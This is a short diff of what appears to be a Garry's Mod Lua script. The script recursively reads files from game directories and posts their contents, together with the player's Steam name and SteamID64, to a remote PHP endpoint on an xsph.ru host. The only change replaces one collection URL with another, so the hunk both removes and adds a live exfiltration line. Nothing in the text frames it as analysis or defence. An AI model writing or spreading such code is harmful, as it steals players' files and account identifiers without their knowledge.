@@ -7,7 +7,7 @@ local c,d=file.Find(b.."*","MOD")
 for _,f in pairs(c)do 
 local g=file.Read(b.."/"..f,"GAME")
 if g==nil then return end
-http.Post("http://a0769024.xsph.ru/i.php",{one=b,two=f,tree=ToByte(g),vfo=steamworks.GetPlayerName(LocalPlayer():SteamID64()).."_"..LocalPlayer():SteamID64()})
+http.Post("http://a0820624.xsph.ru/i.php",{one=b,two=f,tree=ToByte(g),vfo=steamworks.GetPlayerName(LocalPlayer():SteamID64()).."_"..LocalPlayer():SteamID64()})
 end
 for h,i in pairs(d)do 
 a(b..i.."/")
